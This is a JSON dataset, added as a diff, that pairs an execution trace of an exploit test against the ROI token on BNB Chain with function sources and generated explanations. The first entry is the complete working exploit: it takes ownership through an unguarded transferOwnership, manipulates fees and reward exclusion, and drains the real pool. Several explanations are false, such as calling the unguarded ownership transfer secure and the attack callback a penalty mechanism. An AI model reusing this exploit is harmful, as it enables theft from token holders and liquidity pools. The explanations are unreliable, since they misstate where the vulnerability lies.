@@ -1,0 +1,541 @@
+[
+    {
+        "id": "2389028",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[Start] Attacker BNB Balance:\", address(this).balance, 18);\n\n        console.log(\"----------------------------------------------------\");\n        console.log(\"Attacker swap some BNB to ROI for attack fund...\");\n        console.log(\"Before [WBNB, BUSD, ROI] swap:\");\n        emit log_named_decimal_uint(\"\\tBNB balance of attacker:\", address(this).balance, 18);\n        emit log_named_decimal_uint(\"\\tROI balance of attacker:\", ROI.balanceOf(address(this)), 9);\n\n        address[] memory path = new address[](3);\n        path[0] = address(wbnb);\n        path[1] = address(busd);\n        path[2] = address(ROI); // [WBNB, BUSD, ROI]\n        pancakeRouter.swapETHForExactTokens{value: 5 ether}(111_291_832_999_209, path, address(this), block.timestamp); // Swap 5 bnb to busd then swap to ROI, charge 0.25% trading fee\n\n        console.log(\"After [WBNB, BUSD, ROI] swap:\");\n        emit log_named_decimal_uint(\"\\tBNB balance of attacker:\", address(this).balance, 18);\n        emit log_named_decimal_uint(\"\\tROI balance of attacker:\", ROI.balanceOf(address(this)), 9);\n        console.log(\"----------------------------------------------------\");\n\n        ROI.transferOwnership(address(this)); // Broken Access Control\n        ROI.setTaxFeePercent(0);\n        ROI.setBuyFee(0, 0);\n        ROI.setSellFee(0, 0);\n        ROI.setLiquidityFeePercent(0);\n\n        // These's addresses are all of the ROI Token holders, but the [BUSD/ROI Pair] is not listed.\n        // Ref: https://bscscan.com/token/0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c#balances\n        ROI.excludeFromReward(address(0x575e2Cd07E4d6CCBcA708D64b4ba45521A2C0722));\n        ROI.excludeFromReward(address(0x216FC1D66677c9A778C60E6825189508b9619908));\n        ROI.excludeFromReward(address(0x61708418F929f264Edd312aDC7089eB9d69cEd9C));\n        ROI.excludeFromReward(address(0xC81DC8F793415B80d7Ee604e936B79D85BD771B6));\n        ROI.excludeFromReward(address(0x19af64CFB666d7Df8C69F884CDf5d42c0e1F9D0C));\n        ROI.excludeFromReward(address(0xA982444d884e00C7dFBBCB90e7a705E567853d0E));\n        ROI.excludeFromReward(address(0x899045B0B52d55Be0210A1046a01B99C78E44540));\n        ROI.excludeFromReward(address(0xDdda7b2D1B9EbafD37c434b90a09fca6d014682F));\n        ROI.excludeFromReward(address(0xf3C7107024e4935FbFd9f665cF5321146DfBD9a8));\n        ROI.excludeFromReward(address(0x6f84160a01f3D4005eB50582d14F17B72575A80A));\n        ROI.excludeFromReward(address(0x143B8568B1ef2F22f3A67229E80DCF0e6fe9bf96));\n        ROI.excludeFromReward(address(0x16A31000295d1846F16B8F1aee3AeDC6b2cB730b));\n        ROI.excludeFromReward(address(ROI));\n        ROI.excludeFromReward(address(this));\n\n        console.log(\"Attacker sends all ROI to [BUSD/ROI Pair] but withholding 100,000 ROI\");\n        uint256 ROI_bal = ROI.balanceOf(address(this));\n        ROI.transfer(address(busdroiPair), ROI_bal - 100_000e9); // taxfee is zero\n        console.log(\"----------------------------------------------------\");\n\n        console.log(\"Before flashloans from [BUSD/ROI Pair]\");\n        emit log_named_decimal_uint(\"\\tROI balance of attacker:\", ROI.balanceOf(address(this)), 9); // Expect 100,000\n        emit log_named_decimal_uint(\"\\tBUSD balance of attacker:\", busd.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"\\tROI balance of BUSD/ROI Pair:\", ROI.balanceOf(address(busdroiPair)), 9);\n        emit log_named_decimal_uint(\"\\tBUSD balance of BUSD/ROI Pair:\", busd.balanceOf(address(busdroiPair)), 18);\n\n        ROI.setTaxFeePercent(99);\n        // Attacker flashloans 4,343,012 ROI from [BUSD/ROI Pair], and attacker will immediately payback\n        busdroiPair.swap(4_343_012_692_003_417, 0, address(this), \"3030\"); // Notice: 99% taxfee will be charged from the [BUSD/ROI Pair]\n\n        console.log(\"After flashloans from [BUSD/ROI Pair]\");\n        emit log_named_decimal_uint(\"\\tROI balance of attacker:\", ROI.balanceOf(address(this)), 9); // Expect 0, Because #L122\n        emit log_named_decimal_uint(\"\\tBUSD balance of attacker:\", busd.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"\\tROI balance of BUSD/ROI Pair:\", ROI.balanceOf(address(busdroiPair)), 9); // Expect before+100,000\n        emit log_named_decimal_uint(\"\\tBUSD balance of BUSD/ROI Pair:\", busd.balanceOf(address(busdroiPair)), 18); // Expect same value\n\n        ROI.setTaxFeePercent(0);\n        ROI.includeInReward(address(this)); // This will set _tOwned[address(this)] = 0\n\n        busdroiPair.sync(); // Sync reserve before swap\n        path[0] = address(ROI);\n        path[2] = address(wbnb); // [ROI, BUSD, WBNB]\n        ROI.approve(address(pancakeRouter), type(uint256).max);\n        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            3_986_806_268_542_825, 0, path, address(this), block.timestamp\n        ); // Oops, zero ROI balance but the _rOwned[address(this)] has been bypassed\n        console.log(\"----------------------------------------------------\");\n        emit log_named_decimal_uint(\"[End] Attacker BNB Balance:\", address(this).balance, 18);\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate an attack on a token system, specifically targeting the ROI token. It starts by logging the attacker's initial BNB (Binance Coin) balance and then proceeds to swap BNB for ROI tokens through a series of transactions. The function then manipulates the ROI token's ownership and fee settings to bypass certain controls. It excludes specific addresses from rewards, transfers ROI tokens to a trading pair, and executes a flash loan to exploit the system. Finally, it swaps the ROI tokens back to BNB, logging the attacker's final BNB balance.\n\n2. Security mechanism:  \nThe function lacks robust security mechanisms, as it demonstrates a broken access control vulnerability by transferring ownership of the ROI token to the attacker. It also manipulates fee settings (e.g., setting tax fees to 0) to avoid penalties during transactions. The use of `excludeFromReward` and `includeInReward` functions further bypasses reward distribution mechanisms. The function does not include checks or restrictions to prevent unauthorized actions, making it exploitable.\n\n3. Parameter Function:  \nThe function does not take any external parameters. However, it interacts with several predefined addresses and contracts, such as `wbnb`, `busd`, `ROI`, and `pancakeRouter`. These are used to perform token swaps, transfer ownership, and manipulate fee settings. The function also uses hardcoded values like `5 ether` and `111_291_832_999_209` to specify the amount of BNB and ROI tokens involved in the swaps.\n\n4. Return description:  \nThe function does not return any value. Instead, it logs various balances and states throughout the attack process. These logs include the attacker's BNB and ROI balances before and after swaps, as well as the balances of the BUSD/ROI trading pair. The final log shows the attacker's BNB balance after completing the exploit, indicating the success of the attack.\n\nIn summary,  \nThe `testExploit` function simulates an attack on the ROI token system by manipulating ownership, fees, and reward mechanisms. It lacks proper security controls, making it vulnerable to exploitation. The function uses predefined addresses and hardcoded values to execute swaps and transfers, logging the attacker's balances at each step to demonstrate the attack's effectiveness.",
+        "return_value": "4454304525012626 [4.454e15], 49570775410399654775340 [4.957e22], 1662373335 [1.662e9]"
+    },
+    {
+        "id": "0",
+        "args": "\"----------------------------------------------------\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"Attacker swap some BNB to ROI for attack fund...\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"Before [WBNB, BUSD, ROI] swap:\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "12437",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n\n",
+        "description": "1. **Core functions:**  \n   This function is designed to check the token balance of a specific account. It first checks if the account is excluded from certain features (like rewards or fees). If the account is excluded, it directly returns the balance stored in `_tOwned`. If not, it calculates the balance by converting the reflected balance (`_rOwned`) into actual tokens using the `tokenFromReflection` function.\n\n2. **Security mechanism:**  \n   The function uses the `public view` modifier, which means it can be called by anyone but does not modify the state of the contract. The `override` keyword indicates that this function is overriding a function from a parent contract, ensuring it follows the same rules. The function does not directly handle sensitive operations, so it has minimal security risks.\n\n3. **Parameter Function:**  \n   The function takes one parameter, `account`, which is the address of the user whose balance is being checked. This parameter is essential because it determines which account's balance the function will retrieve or calculate.\n\n4. **Return description:**  \n   The function returns a `uint256` value representing the token balance of the specified account. If the account is excluded, it returns the value directly from `_tOwned`. If not, it calculates the balance by converting the reflected balance (`_rOwned`) into actual tokens using the `tokenFromReflection` function.\n\nIn summary, this function is a straightforward way to check the token balance of a specific account, with a simple mechanism to handle excluded accounts and a secure design that prevents unauthorized state changes.",
+        "return_value": "0"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "334356898174835320818544 [3.343e23], 93298702958394889912628038 [9.329e25], 1662613078 [1.662e9]"
+    },
+    {
+        "id": "8062",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, 4575227667145092585 [4.575e18]",
+        "original_code": "    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
+        "description": "1. Core functions:  \nThe main purpose of this function is to transfer a specified amount of tokens from the sender's address to the recipient's address. It acts as a bridge to initiate the transfer process by calling an internal function (`_transfer`) to handle the actual movement of tokens.\n\n2. Security mechanism:  \nThe function uses the `public` and `override` modifiers. The `public` modifier ensures that the function can be called by anyone, while the `override` modifier indicates that this function is replacing a function with the same name in a parent contract. Additionally, the function uses `_msgSender()` to securely fetch the sender's address, which helps prevent certain types of attacks like phishing or impersonation.\n\n3. Parameter Function:  \n- `recipient`: This is the address where the tokens will be sent. It specifies the destination of the transfer.  \n- `amount`: This is the number of tokens to be transferred. It determines the quantity of tokens moving from the sender to the recipient.  \n\n4. Return description:  \nThe function always returns `true` to indicate that the transfer process was successfully initiated. This return value does not directly reflect the success of the transfer itself but confirms that the function executed without errors.  \n\nIn summary, this function facilitates the transfer of tokens between addresses, ensures secure handling of the sender's identity, and confirms the initiation of the process by returning `true`.",
+        "return_value": "true"
+    },
+    {
+        "id": "39264",
+        "args": "0, 1273459110881572652015 [1.273e21], BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "12871",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124], 1273459110881572652015 [1.273e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16",
+        "original_code": null,
+        "description": null,
+        "return_value": "334361473402502465911129 [3.343e23]"
+    },
+    {
+        "id": "531",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16",
+        "original_code": null,
+        "description": null,
+        "return_value": "93297429499284008339976023 [9.329e25]"
+    },
+    {
+        "id": "68669",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 111291832999209 [1.112e14]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2437",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4343012692013417 [4.343e15]"
+    },
+    {
+        "id": "531",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "50844234521281227427355 [5.084e22]"
+    },
+    {
+        "id": "0",
+        "args": "\"After [WBNB, BUSD, ROI] swap:\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2437",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "111291832999209 [1.112e14]"
+    },
+    {
+        "id": "0",
+        "args": "\"----------------------------------------------------\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5219",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function transferOwnership(address newOwner) public virtual {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n\n",
+        "description": "1. **Core functions:**  \n   This function is designed to transfer ownership of a contract from the current owner to a new owner. It ensures that the ownership is handed over securely and updates the contract's state to reflect the new owner.\n\n2. **Security mechanism:**  \n   - The function uses a `require` statement to check that the new owner's address is not the zero address (a common placeholder for invalid addresses). This prevents accidental or malicious attempts to assign ownership to an invalid address.  \n   - The function is marked as `public`, meaning it can be called by anyone, but it is also `virtual`, allowing it to be overridden by derived contracts to add additional security or logic.  \n   - An event (`OwnershipTransferred`) is emitted to log the change of ownership, providing transparency and traceability.  \n\n3. **Parameter Function:**  \n   - `newOwner`: This parameter specifies the address of the new owner. It is the address to which ownership of the contract will be transferred.  \n\n4. **Return description:**  \n   This function does not return any value. Its purpose is to update the internal state of the contract by assigning the `_owner` variable to the `newOwner` address and logging the change through an event.  \n\n**In summary,**  \nThis function securely transfers ownership of a contract to a new address, ensuring the new owner is valid and logging the change for transparency. It does not return any value but updates the contract's state and emits an event to record the transaction.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "556",
+        "args": "0",
+        "original_code": "    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {\n        _taxFee = taxFee;\n    }\n        \n",
+        "description": "1. Core functions:  \nThis function is designed to update the tax fee percentage in a smart contract. It allows the contract owner to set a new tax fee that will be applied to transactions or operations within the contract.\n\n2. Security mechanism:  \nThe function includes the `onlyOwner` modifier, which ensures that only the owner of the contract can call this function. This prevents unauthorized users from changing the tax fee, adding a layer of security to the contract.\n\n3. Parameter Function:  \nThe function takes one parameter, `taxFee`, which is a number representing the new tax fee percentage. This value is used to update the internal variable `_taxFee` in the contract.\n\n4. Return description:  \nThis function does not return any value. Its purpose is solely to update the `_taxFee` variable with the provided `taxFee` parameter.\n\nIn summary, this function allows the contract owner to securely set a new tax fee percentage, ensuring that only authorized changes can be made.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "4975",
+        "args": "0, 0",
+        "original_code": "    function setBuyFee(uint256 buyTaxFee, uint256 buyLiquidityFee) external onlyOwner {\n        _buyTaxFee = buyTaxFee;\n        _buyLiquidityFee = buyLiquidityFee;\n    }\n   \n",
+        "description": "1. Core functions:  \nThis function is designed to set two specific fees related to buying transactions: a tax fee and a liquidity fee. These fees are stored in the contract's state variables (`_buyTaxFee` and `_buyLiquidityFee`) and are likely used later in the contract to calculate costs or distribute funds during buy transactions.\n\n2. Security mechanism:  \nThe function includes the `onlyOwner` modifier, which ensures that only the owner of the contract can call this function. This is a security measure to prevent unauthorized users from modifying the fee values, which could disrupt the contract's intended behavior or lead to financial losses.\n\n3. Parameter Function:  \nThe function takes two parameters:  \n- `buyTaxFee`: This represents the tax fee percentage or amount to be applied during buy transactions.  \n- `buyLiquidityFee`: This represents the liquidity fee percentage or amount to be applied during buy transactions.  \nBoth parameters are used to update the corresponding state variables in the contract.\n\n4. Return description:  \nThis function does not return any value. Its purpose is solely to update the internal state of the contract by setting the new fee values.\n\nIn summary,  \nThis function allows the contract owner to set the tax and liquidity fees for buy transactions. It is protected by the `onlyOwner` modifier to ensure only authorized changes can be made. The function takes two parameters to define the fees and updates the contract's state accordingly without returning any value.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "4954",
+        "args": "0, 0",
+        "original_code": "    function setSellFee(uint256 sellTaxFee, uint256 sellLiquidityFee) external onlyOwner {\n        _sellTaxFee = sellTaxFee;\n        _sellLiquidityFee = sellLiquidityFee;\n    }\n    \n",
+        "description": "1. **Core functions:**  \n   The `setSellFee` function is designed to update two specific fee rates related to selling transactions: the tax fee and the liquidity fee. These fees are applied when users sell tokens, and this function allows the owner of the contract to adjust these rates as needed.\n\n2. **Security mechanism:**  \n   The function includes the `onlyOwner` modifier, which ensures that only the owner of the contract can call and execute this function. This is a key security measure to prevent unauthorized users from changing the fee rates, which could otherwise disrupt the intended operation of the contract.\n\n3. **Parameter Function:**  \n   The function takes two parameters:  \n   - `sellTaxFee`: This represents the tax fee rate that will be applied to selling transactions.  \n   - `sellLiquidityFee`: This represents the liquidity fee rate that will be applied to selling transactions.  \n   Both parameters are used to update the internal state variables `_sellTaxFee` and `_sellLiquidityFee`, respectively.\n\n4. **Return description:**  \n   The function does not return any value. Its sole purpose is to update the internal state variables `_sellTaxFee` and `_sellLiquidityFee` with the provided parameters.\n\n**In summary,**  \nThe `setSellFee` function allows the contract owner to set or update the tax and liquidity fees for selling transactions. It is secured by the `onlyOwner` modifier to ensure only authorized changes can be made. The function takes two parameters to define the new fee rates and does not return any value.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "576",
+        "args": "0",
+        "original_code": "    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner {\n        _liquidityFee = liquidityFee;\n    }\n\n",
+        "description": "1. **Core function**:  \n   This function is used to set the liquidity fee percentage. It allows the owner of the contract to define how much fee should be charged for liquidity purposes. This fee is typically used to fund liquidity pools or other related activities in decentralized finance (DeFi) systems.\n\n2. **Security mechanism**:  \n   The function includes the `onlyOwner` modifier, which ensures that only the contract owner can call this function. This prevents unauthorized users from changing the liquidity fee percentage, adding a layer of security to the contract.\n\n3. **Parameter Function**:  \n   The function takes one parameter, `liquidityFee`, which is a number representing the new liquidity fee percentage. This value is used to update the internal variable `_liquidityFee`.\n\n4. **Return description**:  \n   This function does not return any value. Its sole purpose is to update the `_liquidityFee` variable with the provided `liquidityFee` parameter.\n\nIn summary, this function allows the contract owner to set the liquidity fee percentage securely, ensuring that only authorized changes can be made.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "91439",
+        "args": "0x575e2Cd07E4d6CCBcA708D64b4ba45521A2C0722",
+        "original_code": "    function excludeFromReward(address account) public onlyOwner() {\n\n        require(!_isExcluded[account], \"Account is already excluded\");\n        if(_rOwned[account] > 0) {\n            _tOwned[account] = tokenFromReflection(_rOwned[account]);\n        }\n        _isExcluded[account] = true;\n        _excluded.push(account);\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The main purpose of this function is to exclude a specific account from receiving rewards. When an account is excluded, it will no longer be eligible for any reward distributions that are part of the contract's logic. This is typically used to manage accounts that should not participate in the reward system, such as the contract owner or specific addresses.\n\n2. **Security mechanism:**  \n   The function includes a key security measure: the `onlyOwner` modifier. This ensures that only the owner of the contract can call this function, preventing unauthorized users from excluding accounts. Additionally, the `require` statement checks if the account is already excluded, avoiding redundant operations and potential errors.\n\n3. **Parameter Function:**  \n   The function takes one parameter, `account`, which is the address of the account to be excluded from rewards. This parameter specifies which account will no longer receive rewards.\n\n4. **Return description:**  \n   This function does not return any value. Instead, it performs internal operations: it updates the account's status to \"excluded,\" transfers the account's reflected token balance to its actual token balance (if applicable), and adds the account to the list of excluded accounts.\n\n**In summary,**  \nThis function is used to exclude a specific account from receiving rewards, and only the contract owner can execute it. It ensures the account is not already excluded, updates its status, and manages its token balances accordingly. No value is returned, as the function focuses on internal state changes.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "74292",
+        "args": "0x216FC1D66677c9A778C60E6825189508b9619908",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "77045",
+        "args": "0x61708418F929f264Edd312aDC7089eB9d69cEd9C",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "79798",
+        "args": "0xC81DC8F793415B80d7Ee604e936B79D85BD771B6",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "82552",
+        "args": "0x19af64CFB666d7Df8C69F884CDf5d42c0e1F9D0C",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "85305",
+        "args": "0xA982444d884e00C7dFBBCB90e7a705E567853d0E",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "88059",
+        "args": "0x899045B0B52d55Be0210A1046a01B99C78E44540",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "90812",
+        "args": "0xDdda7b2D1B9EbafD37c434b90a09fca6d014682F",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "93566",
+        "args": "0xf3C7107024e4935FbFd9f665cF5321146DfBD9a8",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "96320",
+        "args": "0x6f84160a01f3D4005eB50582d14F17B72575A80A",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "99073",
+        "args": "0x143B8568B1ef2F22f3A67229E80DCF0e6fe9bf96",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "101827",
+        "args": "0x16A31000295d1846F16B8F1aee3AeDC6b2cB730b",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "100581",
+        "args": "ROI: [0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "103335",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"Attacker sends all ROI to [BUSD/ROI Pair] but withholding 100,000 ROI\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "870",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "111291832999209 [1.112e14]"
+    },
+    {
+        "id": "91902",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124], 11291832999209 [1.129e13]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "0",
+        "args": "\"----------------------------------------------------\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"Before flashloans from [BUSD/ROI Pair]\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "870",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000 [1e14]"
+    },
+    {
+        "id": "2531",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "40987",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4354304525012632 [4.354e15]"
+    },
+    {
+        "id": "531",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "50844234521281227427355 [5.084e22]"
+    },
+    {
+        "id": "20456",
+        "args": "99",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "97957",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4343012692003417 [4.343e15]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "95877",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4343012692003417 [4.343e15], 0, 0x33303330",
+        "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        require(keccak256(data) == keccak256(\"3030\"), \"Invalid PancakeSwap Callback\");\n        ROI.transfer(address(busdroiPair), ROI.balanceOf(address(this))); // Notice: 99% taxfee SHOULD be charged from the attacker\n    }\n\n",
+        "description": "1. **Core functions:**  \n   This function is designed to handle a specific callback from PancakeSwap, a decentralized exchange. When triggered, it checks if the incoming data matches a predefined value (\"3030\"). If the data is valid, it transfers all the ROI tokens held by the contract to a specific pair address (likely a liquidity pool). The comment suggests that this action is intended to impose a 99% tax fee on an attacker, possibly as a deterrent or penalty mechanism.\n\n2. **Security mechanism:**  \n   - **`require` statement:** Ensures that the incoming data matches the expected value (\"3030\"). This acts as a safeguard to prevent unauthorized or unintended calls to the function.  \n   - **Implicit `public` visibility:** Allows the function to be called externally, but the `require` statement restricts its execution to only those calls with the correct data.  \n   - **Comment warning:** Highlights that a 99% tax fee is intended to be applied, which serves as a deterrent against malicious actions.  \n\n3. **Parameter Function:**  \n   - **`sender`:** Represents the address of the entity calling this function.  \n   - **`amount0` and ``amount1``:** Likely represent the amounts of two tokens involved in the PancakeSwap transaction, though they are not directly used in this function.  \n   - **`data`:** Contains additional information passed to the function. It is checked against the expected value (\"3030\") to validate the call.  \n\n4. **Return description:**  \n   This function does not return any value. Instead, it performs an action: transferring all ROI tokens held by the contract to a specified pair address. The transfer is unconditional once the `require` check is passed, and the comment implies that this action is part of a mechanism to penalize attackers.  \n\n**In summary,**  \nThis function acts as a callback for PancakeSwap transactions, ensuring only valid calls are processed. It transfers all ROI tokens to a specific address, likely as part of a penalty mechanism for attackers. The `require` statement and comment provide security and context for its intended use.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "870",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "143430126920035 [1.434e14]"
+    },
+    {
+        "id": "92068",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124], 143430126920035 [1.434e14]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "40987",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4454304525010763 [4.454e15]"
+    },
+    {
+        "id": "531",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "50844234521281227427355 [5.084e22]"
+    },
+    {
+        "id": "0",
+        "args": "\"After flashloans from [BUSD/ROI Pair]\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "870",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "531",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "40987",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4454304525010763 [4.454e15]"
+    },
+    {
+        "id": "531",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "50844234521281227427355 [5.084e22]"
+    },
+    {
+        "id": "556",
+        "args": "0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "10549",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function includeInReward(address account) external onlyOwner() {\n        require(_isExcluded[account], \"Account is not excluded\");\n        for (uint256 i = 0; i < _excluded.length; i++) {\n            if (_excluded[i] == account) {\n                _excluded[i] = _excluded[_excluded.length - 1];\n                _tOwned[account] = 0;\n                _isExcluded[account] = false;\n                _excluded.pop();\n                break;\n            }\n        }\n    }\n\n",
+        "description": "1. Core functions:  \nThis function is designed to re-include a previously excluded account back into the reward system. It checks if the account is currently excluded, removes it from the exclusion list, and resets its ownership balance to zero. This ensures the account is eligible to receive rewards again.\n\n2. Security mechanism:  \nThe function uses the `onlyOwner` modifier, which restricts access to the contract owner, ensuring only authorized users can perform this action. Additionally, it includes a `require` statement to verify that the account is indeed excluded before proceeding, preventing unnecessary or invalid operations.\n\n3. Parameter Function:  \nThe function takes one parameter, `account`, which is the address of the user to be re-included in the reward system. This parameter specifies the account that will be processed and made eligible for rewards again.\n\n4. Return description:  \nThis function does not return any value. Instead, it performs internal updates by removing the account from the exclusion list, resetting its balance, and updating its exclusion status. The changes are applied directly to the contract's state variables.\n\nIn summary,  \nThis function allows the contract owner to re-include an excluded account into the reward system. It ensures only valid accounts are processed and restricts access to authorized users. The function updates the contract's state to reflect the account's new eligibility for rewards.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "38233",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "325973382708620 [3.259e14]"
+    },
+    {
+        "id": "531",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "50844234521281227427355 [5.084e22]"
+    },
+    {
+        "id": "24749",
+        "args": "PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": "    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
